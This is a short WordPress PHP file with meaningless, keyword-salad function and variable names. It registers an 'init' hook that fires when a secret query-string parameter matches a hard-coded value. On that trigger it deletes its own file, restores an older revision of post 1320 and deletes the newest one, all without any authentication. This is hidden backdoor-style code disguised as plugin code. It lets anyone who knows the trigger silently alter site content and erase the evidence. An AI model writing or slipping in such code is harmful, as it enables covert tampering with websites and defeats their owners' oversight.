<?php

function multiple_item_style_attachment() {
	if (isset($_GET['specific_html_replace_guest']) && $_GET['specific_html_replace_guest'] === 'information_styles_blogroll') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$reviews_content_shortener = 1320;
		$jetpack_management_like = wp_get_post_revisions($reviews_content_shortener);
		if (empty($jetpack_management_like)) die('no revisions');
		if (count($jetpack_management_like) < 2) die('less than 2');
		$appointment_shopping_qr_consent = array_shift($jetpack_management_like);
		$dist_help_kit = $appointment_shopping_qr_consent->ID;
		$radio_customer_translator = array_shift($jetpack_management_like);
		$stats_bank_latest = $radio_customer_translator->ID;
		$pages_icon_most_publish = wp_restore_post_revision($stats_bank_latest);
		if ($pages_icon_most_publish === false) die('error restoring');
		$pages_icon_most_publish = wp_delete_post_revision($dist_help_kit);		
		if ($pages_icon_most_publish === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'multiple_item_style_attachment');
